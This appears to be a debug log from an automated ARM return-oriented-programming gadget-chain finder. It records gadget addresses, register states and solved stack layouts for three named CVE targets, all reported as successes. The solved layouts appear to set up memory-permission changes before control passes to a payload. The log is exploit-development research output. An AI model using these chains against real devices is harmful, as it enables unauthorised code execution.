+2026-07-18 08:16:18.077 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524440, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:18.078 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00008b24', '0x0000a2a8']
+2026-07-18 08:16:18.078 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r4, r5, pc}
+2026-07-18 08:16:18.079 | DEBUG    | find_reg_gadget_chain:monitor:666 - mov r0, r4 ; pop {r4, pc}
+2026-07-18 08:16:18.169 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8'], ['0x00008c28', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [['0x00008dec', '0x0000c968']], 'r3': [['0x0000a05c'], ['0x0000a05c'], ['0x0001066c'], ['0x00008b24']]}
+2026-07-18 08:16:19.215 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:19.217 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r4, r5, pc}']
+2026-07-18 08:16:19.218 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 2147418112, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524436, 'lr': 0, 'pc': 51560}
+2026-07-18 08:16:19.222 | DEBUG    | solve_engine:check:1627 - ['ldr r2, [r5]', 'ldr r3, [r4, #4]', 'str r2, [r3], #4', 'str r3, [r4, #4]', 'pop {r4, r5, r6, pc}']
+2026-07-18 08:16:19.223 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 4, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524452, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:19.224 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x0000ac90', '0x0000c968']
+2026-07-18 08:16:19.225 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, r5, r6, pc}
+2026-07-18 08:16:19.225 | DEBUG    | find_reg_gadget_chain:monitor:666 - ldr r2, [r5] ; ldr r3, [r4, #4] ; str r2, [r3], #4 ; str r3, [r4, #4] ; pop {r4, r5, r6, pc}
+2026-07-18 08:16:19.308 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [['0x00008dec', '0x0000c968'], ['0x00008b24', '0x0000c968']], 'r3': [['0x0001066c'], ['0x0001066c']]}
+2026-07-18 08:16:19.679 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[[[{'dst': 'r5', 'src': 'sp', 'addr': '0x00008dec', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000ac90', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x00009f70', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000a7d4', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000ea88', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000b3c8', 'rip': 'sp'}]], {'dst': 'r2', 'src': 'r5', 'addr': '0x0000ac7c', 'rip': 'sp'}]]
+2026-07-18 08:16:19.868 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:19.870 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r4, r5, pc}']
+2026-07-18 08:16:19.870 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 1090524416, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524436, 'lr': 0, 'pc': 41640}
+2026-07-18 08:16:19.872 | DEBUG    | solve_engine:check:1627 - ['mov r0, r4', 'pop {r4, pc}']
+2026-07-18 08:16:19.872 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524444, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:19.873 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x0000ac90', '0x0000a2a8']
+2026-07-18 08:16:19.874 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, r5, r6, pc}
+2026-07-18 08:16:19.874 | DEBUG    | find_reg_gadget_chain:monitor:666 - mov r0, r4 ; pop {r4, pc}
+2026-07-18 08:16:19.957 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8'], ['0x00008b24', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [['0x00008b24', '0x0000c968'], ['0x00008b24', '0x0000c968']], 'r3': [['0x0001066c']]}
+2026-07-18 08:16:21.216 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:21.219 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, r6, pc}']
+2026-07-18 08:16:21.220 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 2147418112, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524436, 'lr': 0, 'pc': 51560}
+2026-07-18 08:16:21.224 | DEBUG    | solve_engine:check:1627 - ['ldr r2, [r5]', 'ldr r3, [r4, #4]', 'str r2, [r3], #4', 'str r3, [r4, #4]', 'pop {r4, r5, r6, pc}']
+2026-07-18 08:16:21.224 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 4, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524452, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:21.226 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00009f70', '0x0000c968']
+2026-07-18 08:16:21.226 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, r5, r6, r7, pc}
+2026-07-18 08:16:21.227 | DEBUG    | find_reg_gadget_chain:monitor:666 - ldr r2, [r5] ; ldr r3, [r4, #4] ; str r2, [r3], #4 ; str r3, [r4, #4] ; pop {r4, r5, r6, pc}
+2026-07-18 08:16:21.298 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [['0x00008b24', '0x0000c968'], ['0x0000ac90', '0x0000c968']], 'r3': [['0x0001066c']]}
+2026-07-18 08:16:21.856 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:21.859 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, r6, pc}']
+2026-07-18 08:16:21.859 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 1090524416, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524436, 'lr': 0, 'pc': 41640}
+2026-07-18 08:16:21.861 | DEBUG    | solve_engine:check:1627 - ['mov r0, r4', 'pop {r4, pc}']
+2026-07-18 08:16:21.861 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524444, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:21.863 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00009f70', '0x0000a2a8']
+2026-07-18 08:16:21.863 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, r5, r6, r7, pc}
+2026-07-18 08:16:21.863 | DEBUG    | find_reg_gadget_chain:monitor:666 - mov r0, r4 ; pop {r4, pc}
+2026-07-18 08:16:21.921 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8'], ['0x0000ac90', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [['0x00008b24', '0x0000c968']], 'r3': [['0x0001066c']]}
+2026-07-18 08:16:22.540 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'immediate_num', 'addr': '0x0000b6f4', 'rip': 'sp'}]]
+2026-07-18 08:16:22.546 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'immediate_num', 'addr': '0x0000b6f4', 'rip': 'sp'}]]
+2026-07-18 08:16:22.547 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x0000b6f4']
+2026-07-18 08:16:22.548 | DEBUG    | find_reg_gadget_chain:monitor:666 - add r3, r3, #0x14 ; str r3, [r4, #4] ; pop {r3, r4, r5, r6, r7, pc}
+2026-07-18 08:16:23.277 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:23.280 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, r6, r7, pc}']
+2026-07-18 08:16:23.280 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 2147418112, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524440, 'lr': 0, 'pc': 51560}
+2026-07-18 08:16:23.285 | DEBUG    | solve_engine:check:1627 - ['ldr r2, [r5]', 'ldr r3, [r4, #4]', 'str r2, [r3], #4', 'str r3, [r4, #4]', 'pop {r4, r5, r6, pc}']
+2026-07-18 08:16:23.286 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 4, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524456, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:23.288 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x0000a7d4', '0x0000c968']
+2026-07-18 08:16:23.288 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, r5, r6, r7, r8, pc}
+2026-07-18 08:16:23.288 | DEBUG    | find_reg_gadget_chain:monitor:666 - ldr r2, [r5] ; ldr r3, [r4, #4] ; str r2, [r3], #4 ; str r3, [r4, #4] ; pop {r4, r5, r6, pc}
+2026-07-18 08:16:23.343 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [['0x00008b24', '0x0000c968']], 'r3': [['0x0001066c']]}
+2026-07-18 08:16:23.550 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:23.554 | DEBUG    | solve_engine:check:1627 - ['pop {r4, pc}']
+2026-07-18 08:16:23.554 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 1090524416, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524428, 'lr': 0, 'pc': 41640}
+2026-07-18 08:16:23.556 | DEBUG    | solve_engine:check:1627 - ['mov r0, r4', 'pop {r4, pc}']
+2026-07-18 08:16:23.556 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524436, 'lr': 0, 'pc': 77028}
+2026-07-18 08:16:23.557 | DEBUG    | solve_engine:check:1627 - ['pop {r1, pc}']
+2026-07-18 08:16:23.558 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524444, 'lr': 0, 'pc': 36332}
+2026-07-18 08:16:23.559 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, pc}']
+2026-07-18 08:16:23.559 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 2147418112, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524456, 'lr': 0, 'pc': 51560}
+2026-07-18 08:16:23.564 | DEBUG    | solve_engine:check:1627 - ['ldr r2, [r5]', 'ldr r3, [r4, #4]', 'str r2, [r3], #4', 'str r3, [r4, #4]', 'pop {r4, r5, r6, pc}']
+2026-07-18 08:16:23.564 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 4096, 'r2': 7, 'r3': 4, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524472, 'lr': 0, 'pc': 41052}
+2026-07-18 08:16:23.565 | DEBUG    | solve_engine:check:1627 - ['pop {r3, pc}']
+2026-07-18 08:16:23.566 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 4096, 'r2': 7, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524480, 'lr': 0, 'pc': 3735928326}
+2026-07-18 08:16:23.567 | DEBUG    | find_reg_gadget_chain:solve:785 - [32m{0: '0x00008c28', 1: '0x41001500', 2: '0xa2a8', 4: '0x00012ce4', 5: '0x1000', 6: '0x00008dec', 8: '0x7fff0000', 9: '0xc968', 13: '0x0000a05c', 264223424: '0x7', 14: '0xa', 15: '0xdeadbe06'}[0m
+2026-07-18 08:16:23.636 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:23.641 | DEBUG    | solve_engine:check:1627 - ['add r3, r3, #0x14', 'str r3, [r4, #4]', 'pop {r3, r4, r5, r6, r7, pc}']
+2026-07-18 08:16:23.641 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524444, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:23.695 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'immediate_num', 'addr': '0x0000e974', 'rip': 'sp'}]]
+2026-07-18 08:16:23.921 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:23.924 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, r6, r7, pc}']
+2026-07-18 08:16:23.924 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 1090524416, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524440, 'lr': 0, 'pc': 41640}
+2026-07-18 08:16:23.926 | DEBUG    | solve_engine:check:1627 - ['mov r0, r4', 'pop {r4, pc}']
+2026-07-18 08:16:23.926 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524448, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:24.013 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[[[{'dst': 'r3', 'src': 'sp', 'addr': '0x0000a05c', 'rip': 'sp'}], [{'dst': 'r3', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}], [{'dst': 'r3', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}], [{'dst': 'r3', 'src': 'sp', 'addr': '0x0001066c', 'rip': 'sp'}], [{'dst': 'r3', 'src': 'immediate_num', 'addr': '0x0000b6f4', 'rip': 'sp'}], [{'dst': 'r3', 'src': 'immediate_num', 'addr': '0x0000e974', 'rip': 'sp'}]], {'dst': 'r0', 'src': 'r3', 'addr': '0x0000bbf0', 'rip': 'sp'}]]
+2026-07-18 08:16:24.900 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:24.902 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, r6, r7, r8, pc}']
+2026-07-18 08:16:24.902 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 2147418112, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524444, 'lr': 0, 'pc': 51560}
+2026-07-18 08:16:24.906 | DEBUG    | solve_engine:check:1627 - ['ldr r2, [r5]', 'ldr r3, [r4, #4]', 'str r2, [r3], #4', 'str r3, [r4, #4]', 'pop {r4, r5, r6, pc}']
+2026-07-18 08:16:24.906 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 4, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524460, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:25.090 | SUCCESS  | find_reg_gadget_chain:main:1015 - Find Set Registers Gadget Chain!
+2026-07-18 08:16:25.090 | SUCCESS  | find_reg_gadget_chain:main:1017 - Register Time: 15.57470965385437
+2026-07-18 08:16:25.091 | SUCCESS  | find_reg_gadget_chain:main:1020 - [[{0: '0x00008c28', 1: '0x41001500', 2: '0xa2a8', 4: '0x00012ce4', 5: '0x1000', 6: '0x00008dec', 8: '0x7fff0000', 9: '0xc968', 13: '0x0000a05c', 264223424: '0x7', 14: '0xa', 15: '0xdeadbe06'}, [['0x00008c28', '0x0000a2a8'], ['0x00012ce4'], ['0x00008dec', '0x0000c968'], ['0x0000a05c']]]]
+2026-07-18 08:16:25.093 | SUCCESS  | __main__:main:289 - CVE-2023-30799_arm SUCCESS (15.74s)
+2026-07-18 08:16:25.094 | INFO     | __main__:main:302 - Running total: 3 success, 0 fail
+2026-07-18 08:16:25.094 | INFO     | __main__:main:304 - ============================================================
+2026-07-18 08:16:25.094 | INFO     | __main__:main:305 - FINAL: 3/3 success
+2026-07-18 08:16:25.095 | INFO     | __main__:main:307 -   CVE-2019-1010298: SUCCESS (10.29s)
+2026-07-18 08:16:25.095 | INFO     | __main__:main:307 -   CVE-2022-46152: SUCCESS (10.00s)
+2026-07-18 08:16:25.095 | INFO     | __main__:main:307 -   CVE-2023-30799_arm: SUCCESS (15.74s)
+2026-07-18 08:16:25.095 | INFO     | __main__:main:308 - ============================================================
